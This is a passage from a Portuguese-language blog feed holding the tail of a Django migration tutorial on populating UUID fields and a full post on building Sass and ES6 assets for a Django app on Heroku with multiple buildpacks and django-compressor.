&lt;p&gt;Precisamos adicionar essa função ao atributo &lt;code class=&quot;language-text&quot;&gt;operations&lt;/code&gt;, da &lt;em&gt;migration&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Migration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Migration&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    dependencies &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0002_item_uuid&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

    operations &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;RunPython&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;gen_uuid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; reverse_code&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;RunPython&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;noop&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Utilizamos a função &lt;code class=&quot;language-text&quot;&gt;RunPython&lt;/code&gt; para executar operações em nossa &lt;em&gt;migration&lt;/em&gt;
que dependem de processamento por parte da linguagem (ou do &lt;em&gt;Django&lt;/em&gt;). Em alguns
cenários, esse tipo de operação não tem um processo de &lt;em&gt;rollback&lt;/em&gt;, portanto,
deixamos explícito que não temos como desfazer a operação através do parâmetro
&lt;code class=&quot;language-text&quot;&gt;reverse_code&lt;/code&gt; com valor &lt;code class=&quot;language-text&quot;&gt;migrations.RunPython.noop&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;migration&lt;/em&gt; deve ter ficado mais ou menos assim:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; __future__ &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; unicode_literals

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; uuid
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; migrations&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; transaction


&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;gen_uuid&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;apps&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; schema_editor&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    Item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; apps&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get_model&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Item&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    items &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; item &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; items&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; uuid&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;uuid4&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        item&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;save&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Migration&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Migration&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    dependencies &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;lista_de_compras&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;0002_item_uuid&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;

    operations &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;RunPython&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;gen_uuid&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; reverse_code&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;migrations&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;RunPython&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;noop&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ainda não acabou! Uma vez que todos os registros já possuam o seu &lt;code class=&quot;language-text&quot;&gt;uuid&lt;/code&gt;
preenchido, precisamos voltar à proposta original do nosso modelo: Com
um campo default, e com preenchimento obrigatório. Para tanto, basta
executar novamente o &lt;code class=&quot;language-text&quot;&gt;makemigrations&lt;/code&gt;. Uma nova &lt;em&gt;migration&lt;/em&gt; será criada,
com todas as &lt;em&gt;constraints&lt;/em&gt; definidas corretamente.&lt;/p&gt;
&lt;p&gt;Agora rode o &lt;code class=&quot;language-text&quot;&gt;migrate&lt;/code&gt;. Acabamos de criar um campo &lt;code class=&quot;language-text&quot;&gt;uuid&lt;/code&gt;,
preenchemos os registros já existentes no &lt;em&gt;database&lt;/em&gt;, e criamos
&lt;em&gt;constraints&lt;/em&gt; para os registros que virão no futuro.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.10/topics/migrations/&quot;&gt;Django documentation: Migrations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://south.readthedocs.io/en/latest/whataremigrations.html&quot;&gt;South documentation: What are migrations?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Django, Sass e ES6 no Heroku com Multiple Buildpacks]]></title><description><![CDATA[Anteriormente, falamos sobre como utilizar o  com Sass
e ES6. Se você quisesse utilizar o Heroku,
com uma aplicação Python executando operações de build
em Node.js, seria uma tarefa um tanto árdua,
que exigiria um certo nível de paciência na
construção do seu próprio Buildpack. Hoje, com o Multiple…]]></description><link>https://klauslaube.com.br/2016/08/27/django-sass-es6-no-heroku-com-multiple-buildpacks.html</link><guid isPermaLink="false">https://klauslaube.com.br/2016/08/27/django-sass-es6-no-heroku-com-multiple-buildpacks.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sat, 27 Aug 2016 16:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Anteriormente, falamos sobre como utilizar o &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt; com &lt;a href=&quot;/tag/sass.html&quot; title=&quot;Leia mais sobre Sass&quot;&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
e &lt;a href=&quot;/tag/es6.html&quot; title=&quot;Leia mais sobre ES6&quot;&gt;&lt;em&gt;ES6&lt;/em&gt;&lt;/a&gt;. Se você quisesse utilizar o &lt;em&gt;Heroku&lt;/em&gt;,
com uma aplicação &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; executando operações de &lt;em&gt;build&lt;/em&gt;
em &lt;a href=&quot;/tag/node.html&quot; title=&quot;Leia mais sobre Node.JS&quot;&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;, seria uma tarefa um tanto árdua,
que exigiria um certo nível de paciência na
construção do seu próprio &lt;em&gt;Buildpack&lt;/em&gt;. Hoje, com o &lt;em&gt;Multiple Buildpacks&lt;/em&gt;, isso não é mais necessário.&lt;/p&gt;
&lt;h2&gt;Build o quê?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Buildpack&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;São conjuntos de scripts que, dependendo da linguagem de programação que você escolher,
resolverão dependências, geração de &lt;em&gt;assets&lt;/em&gt; e até mesmo compilação arquivos, dentro da plataforma &lt;em&gt;Heroku&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ou seja, eles são uma espécie de &quot;provisionamento&quot;, onde você escreverá uma série de
instruções que deixarão o ambiente preparado para receber o seu projeto.&lt;/p&gt;
&lt;p&gt;Antigamente, para você trabalhar com compilação/transpilação de &lt;em&gt;assets&lt;/em&gt; em um projeto
&lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;, você tinha duas opções:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Utilizar (ou construir) um &lt;em&gt;Buildpack&lt;/em&gt; customizado que realizasse o procedimento de instalação das dependências e build (como o &lt;a href=&quot;https://github.com/jiaaro/heroku-buildpack-django&quot; title=&quot;Veja o repositório no GitHub&quot;&gt;heroku-buildpack-django&lt;/a&gt;);&lt;/li&gt;
&lt;li&gt;&quot;Commitar&quot; os arquivos &quot;buildados&quot; e utilizar o &lt;em&gt;Buildpack Python&lt;/em&gt; padrão.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Eu nunca tive muita paciência com a questão de provisionamento no &lt;em&gt;Heroku&lt;/em&gt;,
então geralmente eu partia para a ignorância e vivia &quot;commitando&quot; &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; compilados.&lt;/p&gt;
&lt;h2&gt;Repita comigo: Nunca mais vou commitar arquivos compilados&lt;/h2&gt;
&lt;p&gt;É uma péssima ideia! Principalmente quando você está trabalhando em uma equipe grande.
A quantidade de &lt;em&gt;merge hells&lt;/em&gt; envolvendo arquivos compilados é aquele tipo de dor de
cabeça que você deveria evitar desde o princípio.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 640px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a5e7fde62eb0da75c7d6193857640faa/c08c5/multipack-pacific-rim.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAGAAAAgMAAAAAAAAAAAAAAAAAAAIBAwX/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAHISawFD//EABoQAAICAwAAAAAAAAAAAAAAAAECABEQEjH/2gAIAQEAAQUCAXVas9WLj//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABYQAQEBAAAAAAAAAAAAAAAAABABMf/aAAgBAQAGPwLWv//EABkQAQADAQEAAAAAAAAAAAAAAAEAESFRYf/aAAgBAQABPyG4eK3sKQsziDD5FTnGKrs//9oADAMBAAIAAwAAABD7H//EABURAQEAAAAAAAAAAAAAAAAAAAAR/9oACAEDAQE/EFf/xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/ED//xAAaEAEAAwEBAQAAAAAAAAAAAAABABEhYTFB/9oACAEBAAE/EK0oaJu+D2KDaGsdgsFnNgLgQsD8yM6kRMeS5K2f/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Não dá pra pilotar um Jaeger sozinho (deadline.com)&amp;quot;&quot;
        title=&quot;Não dá pra pilotar um Jaeger sozinho (deadline.com)&quot;
        src=&quot;/static/a5e7fde62eb0da75c7d6193857640faa/c08c5/multipack-pacific-rim.jpg&quot;
        srcset=&quot;/static/a5e7fde62eb0da75c7d6193857640faa/7809d/multipack-pacific-rim.jpg 192w,
/static/a5e7fde62eb0da75c7d6193857640faa/4ecad/multipack-pacific-rim.jpg 384w,
/static/a5e7fde62eb0da75c7d6193857640faa/c08c5/multipack-pacific-rim.jpg 640w&quot;
        sizes=&quot;(max-width: 640px) 100vw, 640px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Não dá pra pilotar um Jaeger sozinho (deadline.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;De forma bem resumida, vamos ilustrar como funcionaria o fluxo de &lt;em&gt;build&lt;/em&gt; de estáticos com
múltiplos &lt;em&gt;Buildpacks&lt;/em&gt;. Para começar, vamos criar um novo &lt;em&gt;app&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ heroku create&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Caso você tenha dúvidas sobre como criar um projeto &lt;em&gt;Python&lt;/em&gt; no &lt;em&gt;Heroku&lt;/em&gt;,
o &quot;&lt;a href=&quot;https://devcenter.heroku.com/articles/getting-started-with-python#introduction&quot; title=&quot;Leia documentação oficial&quot;&gt;Getting started&lt;/a&gt;&quot; deles é muito bacana e fácil de seguir.&lt;/p&gt;
&lt;p&gt;Supondo que já instalamos o &lt;em&gt;Django&lt;/em&gt;, e que criamos os arquivos &lt;code class=&quot;language-text&quot;&gt;runtime.txt&lt;/code&gt;,
determinando qual a versão do &lt;em&gt;Python&lt;/em&gt; que usaremos, e &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt;,
para resolução de dependências, automaticamente o &lt;em&gt;Heroku&lt;/em&gt; saberá preparar
o ambiente para o nosso projeto.&lt;/p&gt;
&lt;p&gt;Mas caso você queira ter certeza disso, podemos usar o comando &lt;code class=&quot;language-text&quot;&gt;buildpacks:set&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ heroku buildpacks:set heroku/python&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Como no &lt;a href=&quot;/2016/06/04/django-e-sass-com-django-compressor.html&quot; title=&quot;Django e Sass com django-compressor&quot;&gt;&lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;,
utilizaremos a biblioteca &lt;em&gt;Python&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;libsass&lt;/code&gt;. Logo, vamos adicioná-la ao &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;# requirements.txt

Django
django-compressor
libsass&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não podemos deixar de configurar o &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;

COMPRESS_PRECOMPILERS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/x-sass&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;sassc {infile} {outfile}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mas e o &lt;em&gt;ES6&lt;/em&gt;? Precisaremos do &lt;a href=&quot;/tag/babel.html&quot; title=&quot;Leia mais sobre BabelJS&quot;&gt;BabelJS&lt;/a&gt;,
e consequentemente do &lt;em&gt;Node.js&lt;/em&gt;, para realizar o &lt;em&gt;transpiling&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Python + Node.js em uma mesma instância Heroku&lt;/h2&gt;
&lt;p&gt;Para adicionar um novo &lt;em&gt;Buildpack&lt;/em&gt;, temos o seguinte comando:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ heroku buildpacks:add --index 1 heroku/nodejs&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Onde &lt;code class=&quot;language-text&quot;&gt;--index&lt;/code&gt; determina qual será a ordem de execução do &lt;em&gt;Buildpack&lt;/em&gt;.
Nesse caso, opto por ele ser o primeiro e o do &lt;em&gt;Python&lt;/em&gt; segundo,
somente para garantir que todas as dependências estejam sanadas quando
a resolução de estáticos do &lt;em&gt;Django&lt;/em&gt; acontecer.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Buildpack Python&lt;/em&gt; executa operações dependendo de alguns arquivos
do nosso projeto. Por exemplo, como mencionado acima, precisamos especificar
a versão da linguagem (&lt;code class=&quot;language-text&quot;&gt;runtime.txt&lt;/code&gt;), instalar as dependências do projeto
(&lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt;) e no caso do &lt;em&gt;Django&lt;/em&gt;, executar a operação de
&lt;code class=&quot;language-text&quot;&gt;collectstatic&lt;/code&gt; após o deploy (&lt;code class=&quot;language-text&quot;&gt;manage.py&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;No caso do &lt;em&gt;Node.js&lt;/em&gt;, precisaremos ter um arquivo &lt;code class=&quot;language-text&quot;&gt;package.json&lt;/code&gt; na raíz do
projeto, contendo todas as bibliotecas que o projeto usa, para essa linguagem:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ npm init .
$ npm install --save babelify babel-preset-es2015&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não podemos esquecer do &lt;code class=&quot;language-text&quot;&gt;.babelrc&lt;/code&gt;, essencial para a execução do &lt;em&gt;Babel&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// .babelrc&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&quot;presets&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;es2015&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E por fim, falta adicionar o pré-compilador ao &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# settings.py&lt;/span&gt;

COMPRESS_PRECOMPILERS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/x-sass&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;sassc {infile} {outfile}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/es6&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./node_modules/.bin/browserify {infile} -t babelify --outfile {outfile}&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Ao dar o &lt;code class=&quot;language-text&quot;&gt;git push heroku master&lt;/code&gt;, a plataforma executará primeiro o
&lt;em&gt;Buildback Node.js&lt;/em&gt;, e na sequência o &lt;em&gt;Buildpack Python&lt;/em&gt;. No momento de entrega das
páginas, teremos os binários &lt;code class=&quot;language-text&quot;&gt;browserify&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;sassc&lt;/code&gt; instalados em nossa instância,
e poderemos entregar nossas páginas com &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; compilados sem a necessidade de &quot;commitá-los&quot;.&lt;/p&gt;
&lt;h2&gt;Comprimindo no momento do deploy&lt;/h2&gt;
&lt;p&gt;Comprimir/compilar &lt;em&gt;assets&lt;/em&gt; no momento da requisição também é algo que deve ser evitado.
Embora o &lt;em&gt;Django Compressor&lt;/em&gt; faça um excelente trabalho nesse quesito, se estivermos usando
uma &lt;em&gt;CDN&lt;/em&gt; para a entrega desses estáticos, esse procedimento não deve acontecer durante a requisição de um usuário.&lt;/p&gt;
&lt;p&gt;Para executar o comando &lt;code class=&quot;language-text&quot;&gt;compress&lt;/code&gt; da biblioteca &lt;code class=&quot;language-text&quot;&gt;django-compressor&lt;/code&gt; em tempo de &lt;em&gt;deploy&lt;/em&gt;,
basta fazermos duas coisas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Garantir que &lt;code class=&quot;language-text&quot;&gt;COMPRESS_OFFLINE&lt;/code&gt;, na configuração do seu projeto, esteja setado como &lt;code class=&quot;language-text&quot;&gt;True&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Criar um diretório &lt;code class=&quot;language-text&quot;&gt;bin&lt;/code&gt;, e dentro dele um arquivo &lt;code class=&quot;language-text&quot;&gt;post_compile&lt;/code&gt;, com a instrução de &lt;code class=&quot;language-text&quot;&gt;compress&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token shebang important&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;

python manage.py compress&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Feito! Agora a cada &lt;em&gt;deploy&lt;/em&gt; da sua aplicação, o &lt;em&gt;build&lt;/em&gt; dos &lt;em&gt;assets&lt;/em&gt; acontecerá
automaticamente, dispensando assim a necessidade de ficar enviando &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt; &quot;buildados&quot;
através de &lt;code class=&quot;language-text&quot;&gt;git push&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Dúvidas sobre a relação entre Django, Sass e ES6? Eu a detalho um pouco melhor nesses dois posts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2016/06/20/django-e-es6-com-django-compressor.html&quot;&gt;Django e ES6 com django-compressor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html&quot;&gt;Django e Sass com django-compressor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://devcenter.heroku.com/articles/using-multiple-buildpacks-for-an-app&quot;&gt;Heroku Dev Center: Using Multiple Buildpacks for an App&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Django e ES6 com django-compressor]]></title><description><![CDATA[No post anterior,
falamos sobre como utilizar o Sass
com o framework Django
através da biblioteca Compressor (e sem necessitar de uma
ferramenta intermediária para build). Nesse artigo, vamos utilizar
